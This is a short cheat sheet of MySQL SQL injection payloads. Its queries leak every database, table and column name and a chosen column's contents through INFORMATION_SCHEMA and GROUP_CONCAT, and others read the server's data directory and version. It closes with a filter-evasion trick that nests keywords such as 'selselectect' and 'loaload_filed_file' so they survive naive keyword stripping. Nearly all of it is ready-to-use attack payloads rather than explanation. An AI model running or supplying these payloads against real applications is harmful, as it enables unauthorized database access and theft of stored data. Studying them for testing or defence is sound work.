


# Leak all of the database names as a string
SELECT GROUP_CONCAT( SCHEMA_NAME ) FROM INFORMATION_SCHEMA.SCHEMATA

# Leak all of the tables in one database as a string
SELECT GROUP_CONCAT( TABLE_NAME ) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="<DATABASE_NAME>"

# Leak the column names of a table as a string
SELECT GROUP_CONCAT( COLUMN_NAME ) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="<TABLE NAME>"


# Leak the ONE column from a table
SELECT GROUP_CONCAT( "<COLUMN_NAME>" ) FROM "<TABLE NAME>"


# Get the path of the running MySQL instance
SELECT @@datadir

# Get the version of the running MySQL instance
SELECT @@version



# Some applications try to replace keywords with an empty string. If this is the case,
# try and trick it by placing the keyword inside of itself. This is devious! 
frfromom => from
oorr => or
loaload_filed_file => load_file
selselectect => select